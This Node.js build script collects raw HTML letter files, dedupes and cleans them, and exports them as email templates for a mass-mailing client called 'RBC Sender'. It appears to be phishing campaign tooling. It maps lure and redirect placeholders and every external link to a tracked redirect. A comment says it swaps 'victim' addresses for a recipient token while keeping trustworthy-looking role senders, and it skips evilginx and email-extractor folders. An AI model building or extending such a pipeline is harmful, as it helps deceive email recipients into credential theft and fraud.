#!/usr/bin/env node
// Builds client/src/letterTemplates.js from raw HTML letter files.
// Usage: node tools/build-letter-templates.mjs <dir> [dir2 ...]
// Dedupes by content hash, drops credential/landing pages, strips scripts,
// rewrites links + common tokens to RBC Sender placeholders.

import { createHash } from 'node:crypto';
import { readdirSync, readFileSync, statSync, writeFileSync } from 'node:fs';
import { basename, join, relative } from 'node:path';

const SKIP_PATH = /evilginx|node_modules|contact-us-tool|netryx_full_src|\/results\/|monitor|vendor\/|\.git|dist\/|src\/|page\/template|run\/templates|Desktop[\\/]run|EmailExtractor/i;
const TXT_TAG = /<(html|body|table|div|p|span|td|tr|a|img|h[1-6]|!doctype|tbody|font|center|b|i|u|br|hr)\b/i;
const SKIP_NAME = /^(js[_ ]|C_Users)/i;
const SKIP_CONTENT = /<form\b|type=["']?password|name=["']?password|<input\b[^>]*password|\{\{[^}]*\}\}/i;
const TOKEN_MAP = [
  [/\{lure_url_html\}|\{lure_url_js\}|\{lure_url\}|\{redirectUrl\}|\{redirect_url\}/gi, '++rbc_url++'],
  [/\{email\}/gi, '++rbc_email++'],
  [/\[Email\]/gi, '++rbc_email++'],
  [/\[Email_LocalPart\]/gi, '++rbc_user++'],
  [/\[Email_DomainPart\]/gi, '++rbc_domain++'],
  [/\[Date_long\]/gi, '[Datum_lang]'],
  [/\{username\}/gi, '++rbc_user++'],
  [/\{current_date\}|\{date\}|\{year\}/gi, '++rbc_date++'],
  [/\{name\}/gi, '[Firstname]'],
  [/\{domain\}/gi, '++rbc_domain++'],
];

function* walk(dir) {
  for (const entry of readdirSync(dir, { withFileTypes: true })) {
    const p = join(dir, entry.name);
    if (entry.isDirectory()) { if (!SKIP_PATH.test(p)) yield* walk(p); }
    else if (/\.(html?|txt)$/i.test(entry.name)) yield p;
  }
}

function cleanLabel(file) {
  let name = basename(file).replace(/\.(html?|txt)$/i, '');
  name = name.replace(/\s*\(\d+\)\s*/g, ' ').replace(/_/g, ' ');
  name = name.replace(/\s+/g, ' ').trim() || 'letter';
  return name.slice(0, 60);
}

function refine(html) {
  let out = html
    .replace(/<script\b[\s\S]*?<\/script\s*>/gi, '')
    .replace(/<script\b[^>]*\/>/gi, '')
    .replace(/\son\w+\s*=\s*"[^"]*"/gi, '')
    .replace(/\son\w+\s*=\s*'[^']*'/gi, '');
  for (const [re, rep] of TOKEN_MAP) out = out.replace(re, rep);
  // every external link becomes the tracked redirect
  out = out.replace(/href\s*=\s*(["'])https?:\/\/[^"']*\1/gi, 'href="++rbc_url++"');
  // baked-in victim/personal addresses → recipient placeholder; role addresses stay
  out = out.replace(/[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}/g, (m) =>
    /^(support|no-?reply|donotreply|info|sales|contact|hello|office|mail|admin|registrar|billing|help|team|service|press|media|hr|jobs|careers|webmaster|postmaster|marketing|noreply|webauth|wordpress|notifications?|alerts?|updates?|verify|secure|billing|payments?|invoices?|receipts?|statements?|accounts?|security|privacy|legal|terms|abuse|hostmaster|usenet|news|root|ssl|cert|dns|whois|example)/i.test(m.split('@')[0]) ? m : '++rbc_email++');
  return out;
}

function htmlToText(html) {
  return html
    .replace(/<style\b[\s\S]*?<\/style>/gi, ' ')
    .replace(/<[^>]+>/g, ' ')
    .replace(/&nbsp;/gi, ' ').replace(/&amp;/gi, '&').replace(/&lt;/gi, '<').replace(/&gt;/gi, '>')
    .replace(/\s+/g, ' ').trim().slice(0, 4000);
}

function subjectOf(html, label) {
  const head = html.slice(0, 3000);
  const m = head.match(/Subject:\s*([^\n<]{3,150})/i);
  if (m) return m[1].trim();
  const t = head.match(/<title[^>]*>([^<]{3,150})<\/title>/i);
  if (t) return t[1].replace(/\s*[|\-–—]\s*.*/g, '').trim();
  return `${label} — important notice`;
}

const files = [];
for (const dir of process.argv.slice(2)) {
  try { files.push(...walk(dir)); } catch (e) { console.error(`skip dir ${dir}: ${e.message}`); }
}

const seen = new Set();
const templates = [];
for (const file of files) {
  if (SKIP_PATH.test(file)) continue;
  if (SKIP_NAME.test(basename(file))) continue;
  let raw;
  try { raw = readFileSync(file, 'utf8'); } catch { continue; }
  const isTxt = /\.txt$/i.test(file);
  if (raw.length < 2000 || raw.length > 900 * 1024) continue;
  if (raw.slice(0, 4) === 'PK\x03\x04' || /[\x00-\x08\x0B\x0C\x0E-\x1F]{4,}/.test(raw.slice(0, 8000))) continue;
  if (isTxt) {
    if (!TXT_TAG.test(raw)) continue;
    const lines = raw.split('\n');
    const emailLines = lines.filter((l) => /^\s*\S+@\S+/.test(l)).length;
    if (emailLines > lines.length * 0.3) continue;
  }
  if (!/<body|<table|<[a-z]+[\s>]/i.test(raw)) continue;
  if (SKIP_CONTENT.test(raw)) continue;
  const hash = createHash('md5').update(raw).digest('hex');
  if (seen.has(hash)) continue;
  seen.add(hash);
  const html = refine(raw);
  if (htmlToText(html).length < 80) continue;
  let label = cleanLabel(file);
  let n = 2;
  while (templates.some((t) => t.label === `✉ ${label}`)) label = `${cleanLabel(file)} (${n++})`;
  templates.push({
    label: `✉ ${label}`,
    subject: subjectOf(raw, label),
    html,
    text: htmlToText(html),
  });
}

templates.sort((a, b) => a.label.localeCompare(b.label));

const out = `// AUTO-GENERATED by tools/build-letter-templates.mjs — do not edit by hand.
// ${templates.length} letter templates refined for RBC Sender placeholders.
export const EXTRA_TEMPLATES = ${JSON.stringify(templates, null, 1)};
`;
writeFileSync(new URL('../client/src/letterTemplates.js', import.meta.url), out);
console.log(`${templates.length} templates → client/src/letterTemplates.js (${(out.length / 1024).toFixed(0)} KB)`);
